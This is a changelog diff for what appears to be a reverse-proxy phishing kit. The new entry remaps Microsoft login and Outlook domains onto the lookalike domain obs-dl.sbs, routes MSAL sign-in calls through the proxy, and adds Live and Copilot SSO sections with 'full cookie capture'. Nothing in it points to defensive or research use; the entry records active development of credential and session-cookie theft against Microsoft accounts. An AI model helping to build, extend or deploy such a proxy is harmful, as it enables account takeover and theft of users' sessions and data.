@@ -1,3 +1,16 @@
+## [1.0.34]
+
+### Bug Fixes
+- **OWA Login-First Architecture (BREAKING)**: Switch domain mapping so `login.microsoftonline.com` maps to root `obs-dl.sbs` and `outlook.office365.com` maps to `outlook.obs-dl.sbs` subdomain
+- This fixes the OWA 401 startupdata error by routing MSAL.js discovery calls through the proxy (same domain) instead of letting them bypass to the real Microsoft
+- Removed MSAL fetch interceptor JS injection (no longer needed with login-first approach)
+- **Note**: OWA entry URL changes from `obs-dl.sbs/owa/` to `outlook.obs-dl.sbs/owa/`
+
+### New Features
+- Added proxy sections: `login.windows.net`, `ms-sso.copilot.microsoft.com`, `ms-sso.copilot.com`, `account.live.com`
+- Added `outlook.live.com` consumer OWA section with full cookie capture
+- Added Copilot SSO domain rewrites across all sections
+
 ## [1.0.33]
 
 ### Bug Fixes
